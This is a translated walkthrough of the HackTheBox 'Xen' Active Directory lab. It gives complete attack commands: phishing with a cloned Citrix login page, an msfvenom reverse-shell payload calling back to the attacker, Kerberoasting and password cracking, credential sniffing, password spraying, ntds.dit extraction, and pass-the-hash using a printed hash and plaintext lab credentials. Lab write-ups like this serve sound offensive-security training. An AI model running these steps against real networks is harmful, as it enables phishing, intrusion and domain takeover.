HackTheBox endgame. Walkthrough Xen Lab. Pentest Active Directory



In this article, we will analyze the passage not just of a car, but of an entire mini-laboratory from the HackTheBox site .

As stated in the description, Xen is designed to test skills at all stages of attacks in a small Active Directory environment. The goal is to compromise an accessible host, increase privileges and, ultimately, compromise the entire domain, while collecting 6 flags.

See a discussion of another Professional Offensive Operations lab here .

Connection to the laboratory is via VPN. It is recommended not to connect from a work computer or from a host where the data important to you is available, since you get into a private network with people who know something in the field of information security :)

Intro


This endgame consists of 6 machines, and contains 6 flags.



The description and address of the available host is also given.



Let's get started!

Breach flag


This machine has an IP address of 10.13.38.12, which I add to / etc / hosts.
10.13.38.12 xen.htb

First, we scan open ports. Since it takes a long time to scan all the ports with nmap, I will first do this with masscan. We scan all TCP and UDP ports from the tun0 interface at a speed of 500 packets per second.

sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.12 --rate=500



Now, for more detailed information about the services that operate on ports, we will run a scan with the -A option.

nmap -A xen.htb -p25,80,443



Thus, we have IIS and SMTP. At the same time, there is the possibility of both HTTP and HTTPS connections on ports 80 and 443. Let's see the web - we are greeted by a simple site.



There is nothing interesting, except for the link “Join the team”, indicating us the email address jointheteam@humongousretail.com.



Let's go through the directories. I use gobuster for this. In the parameters we indicate the number of streams 128 (-t), URL (-u), dictionary (-w) and extensions that interest us (-x).

gobuster dir -t 128 -u http://xen.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,aspx



And we find some interesting directories. The 401 code indicates the presence of HTTP authentication, let's look towards remote.



We accept, and we require credentials.



We need credentials. With this, I decided to return to the SMTP server and sort through the usernames (I recommend using the one that Metasploit offers as a list of names). We do this using smtp-user-enum.

smtp-user-enum -M RCPT -U ./namelist.txt -D humongousretail.com -t xen.htb



We find 4 email addresses. Since we see IT service mail, we can send a message to all other users on their behalf. Let's copy the remote authorization page, make a fake one, and send all the users the fake Remote Portal address (in fact, I was very surprised when it turned out that this is the correct vector).

You can make a full copy of the page using the SingleFile extension for Firefox. Next, take a look at the source code and change the form data. The first is to change the address where the credentials will be sent, I set my host and port 81.



And add Submit to send the data.



Now run netcat to listen on port 81, activate the web server and refer to the modified file as index.html.





It works! Let's send out a message about changing the portal address.



But the vector is correct, but the execution is not very) So we get the data, but in a robotic form on port 80.



Thus we collect all accounts.



And now we go to remote.



And we propose to save the ICA file.



Next, I installed the extension for Chromium.



And connected as pmorgan (VDESKTOP3).





We do the same with other users. And awardel find the first flag.

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.14.9 LPORT=3434 -f exe > s.exe



Now run the metasploit listener.

handler -H 10.14.14.9 -P 3434 -p windows/x64/meterpreter/reverse_tcp



We go through the browser on the target machine, download and run the load. In the Metasploit window, notice the connection in the first session.

Ghost flag


For further exploration it is convenient to use PowerShell, and even more convenient to work through PowerShell Empire (about which I wrote here ). Let's open the session, for this first create an http and PS launcher for it.

> listeners
> uselistener http
> set Host 10.14.14.9
> set Port 5656
> execute
> back
> launcher powershell http



Save the launcher to the s.ps1 file. To run it from memory via meterpreter, you need to load the powershell module.



And execute powershell_import.



In the Empire window, we find the created agent.



For convenient work, rename it by the name of the workstation and go into interactive mode.





For intelligence, we need to define a domain controller. We will do this with the help of one wonderful module get_domain_controller from the section situational_awareness.

> usemodule situational_awareness/network/powerview/get_domain_controller
> run



So we get information about the domain controller. Now let's list the domain users. At this point, I need to get the account names and the value of the AdminCount property to immediately identify privileged users.

> usemodule situational_awareness/network/powerview/get_user
> set Server DC.htb.local
> set Properties samaccountname,admincount
> run



Let's check the SPNs right away to determine if Kerberoasting is possible.

> usemodule situational_awareness/network/powerview/get_user
> set Server DC.htb.local
> set Properties serviceprincipalname
> run



And there is SPN! Let's do Kerberoasting using the same Empire. Specify the output format - hashcat.

> usemodule credentials/invoke_kerberoast
> set OutputFormat Hashcat
> run



And we get the user hash. Now iterate through hashcat.

hashcat -m 13100 -a 0 krb.hash rockyou.txt --force

This password was not found in the rockyou dictionary, so I checked all the dictionaries from Seclists. But this option also failed. The last option is to use NSA rules .



As presented in the repository, dive is the best option, so we use its second version.

hashcat -m 13100 krb.hash rockyou.txt -r nsa-rules/_NSAKEY.v2.dive.rule -debug-mode=1 -debug-file=rule.txt -d 2



And we get the password for this user. For further advancement, let's scan the local network. This is best done using ARP scanning, since ICMP may be blocked. The arpscan module will help us with this. We know the address and mask of the network, so we will set the range of hosts.

> usemodule situational_awareness/network/arpscan
> set Range 172.16.249.0-172.16.249.255
> run



So ... From this list we do not know two hosts: 201 and 202. Let's check the shared resources in the domain. From the parameters we only need the address of the domain controller.

> usemodule situational_awareness/network/powerview/share_finder
> set Server DC.htb.local
> run



With each scan, our understanding of the network expands, let's find out what kind of host CITRIX.htb.local is.



Below is the information that we accumulate.



To interact with resources on the internal network, we need to configure the tunnel. We will do this in the active meterpreter session using the autoroute command, and specify the internal network address and mask as a parameter (with the -p parameter we can check active routes).

run autoroute -s 172.16.249.0/24



Now that we have added the route to the target network, we will use the socks4a tool from inside the platform. The auxiliary module auxiliary / server / socks4a provides a proxy server that uses the Metasploit routing infrastructure that we created to relay connections.



And as a client-redirector we use proxychains. Change its /etc/proxychains.conf config, specifying the port set by metasploit (default port is 1080).



And for the found user, the Citrix $ directory is readable. Since proxychains displays connection information, we remove it using the redirection 2> / dev / null.

proxychains cme smb -u mturner -p '4install!' -d htb.local 172.16.249.201 --share "Citrix$" --shares 2>/dev/null



Let's see everything that is available to us on this resource.

proxychains smbmap -u mturner -p '4install!' -d htb.local -H 172.16.249.201 -R 2>/dev/null



And we find the flag as well as the ppk file. Let's get all the files.

sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install!



When connecting, we get an error that can be eliminated by specifying the client min protocol option.

sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install! --option='client min protocol=NT1' 2>/dev/null



And hand over the flag.





Camouflage flag


Let's figure out the Putty private key.



This private key is encrypted and designed for SSH authorization. Let's go through the password used to decrypt the key. To do this, first reformat the key to john format.



But sorting through standard dictionaries did not work, and they prompted me an excellent tool for generating “conveniently typed” passwords - kwprocessor . Let's create a dictionary.

./kwp -o key-dict.txt basechars/tiny.base keymaps/en.keymap routes/2-to-32-max-5-direction-changes.route



And we have successfully found the 16-character password.

john --wordlist=./kwprocessor/key-dict.txt putty.john



Since I have Linux, it’s more convenient for me to work with a regular SSH client. Reformat the key to this format.

sudo apt install putty-tools
puttygen private.ppk -O private-openssh -o id_rsa

Now we decide where we can get with him. To do this, scanned the internal network to find the open port 22.

proxychains nmap -p22 172.16.249.200-205 2>/dev/null



And we find, but we still do not know anything about this host. Trying to connect without a name, we get an interesting message and a password request.



Examining the names of the users we know did not bring results. Scanning nmap of this service using scripts also yielded nothing.



Then I scanned all the ports on the host. But he did not wait for the end of the scan, since it took a very long time, since in the proxychains information one could observe whether the port is available or not.



Since port 80 was available, I installed a proxy in my browser and went to see what was there.



We are met by the Citrix NetScaler authorization page. And Google brings us to the documentation, in which we recognize the default login.





And with this login we successfully connect via SSH.



After wandering around on the server, I looked at materials on attacks on this type of equipment, one of which is traffic monitoring. Thus, I left tcpdump active for a while and received a traffic dump.

tcpdump -s0 -w r.pcap



Now download this file.

proxychains scp -i id_rsa nsroot@172.16.249.202:/root/r.pcap ./

And to quickly find credentials, we use PCredz .



And we get another flag.



Doppelganger flag


But this program does not look at all, so you need to analyze the dump for the presence of various secrets or tokens. After sorting the packets by protocol, we get to LDAP and find the bindRequest of two users who have a password (we already found one).





Verify this password for this user.

proxychains cme smb -u "netscaler-svc" -p "#S3rvice#@cc" -d htb.local 172.16.249.200 2>/dev/null



This user is not remarkable, except that he is a user of the service. Often the passwords of such users coincide with the passwords of other users of the domain. Let's check which other users will use this password. I did this using metasploit.

proxychains msfconsole 2>/dev/null
> use auxiliary/scanner/smb/smb_login
> set SMBDomain htb.local
> set RHOSTS 172.16.249.200
> set USER_FILE ~/tmp/users.txt
> set PASS_FILE ~/tmp/passwords.txt
> set VERBOSE false
> run



And this password went to all service accounts. As we found out earlier, the backup-svc account is privileged, which means that it is allowed to log on to the domain controller. Check the open ports of the RDP (3389) and WinRM (5985) services.

proxychains nmap -p 3389,5985 172.16.249.200 2>/dev/null



Both login methods are possible, but I prefer WinRM. Log in using the Evil-WinRM program.

proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p "#S3rvice#@cc" 2>/dev/null



And take another flag.



Owned flag


After looking at the information about this user, we see his membership in privileged groups, so that we can copy the ntds.dit file and extract the credentials of domain users.

whoami /all



Of the dump methods of the ntds file, the discshadow option is successfully executed. Let's log in using RDP. As a client, I use remmina.

proxychains remmina





And we are greeted by a command prompt window.



Let's go into the context of diskshadow.



And create a copy - drive Z.

set context persistence nowriters
add volume c: alias sss
create 
expose %sss% z:



Check and see a copy of the ntds.dit file.



We also need a System file to decrypt the ntds database, but it’s easier to get it.

reg.exe save hklm\system C:\Users\backup-svc\Documents\system.bak



But that’s not all, because it’s just that you can’t copy the ntds file. To do this, use the following tool . First, load both DLLs on the host.



And load into memory.



Now we activate the privilege and verify that it is in the Enabled state.

Set-SeBackupPrivilege
Whoami /priv | findstr Backup



Ok, now copy the file.

Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\Users\backup-svc\Documents\ntds.dit

And now we download the ntds and system files to the local host ( and at that moment the laboratory closes and I lose access, right while downloading the files ... It turned out that the laboratory became available only to users with a subscription (went to re-resolution) and I can’t finish the passage ! But many thanks to @kemstat for sharing the VPN config for the duration of the VIP, so that I can finish this passage ). Let's get the credentials.

secretsdump.py -ntds ndts.dit -system system.bak LOCAL



And there is an admin hash. Now use the PTH attack to connect to the server. But psexec (connecting via SMB) prevents us from reading the file.





But WMI gives us unlimited access and we get the privileges of the domain administrator and the last flag.

proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be Administrator@172.16.249.200 2>/dev/null
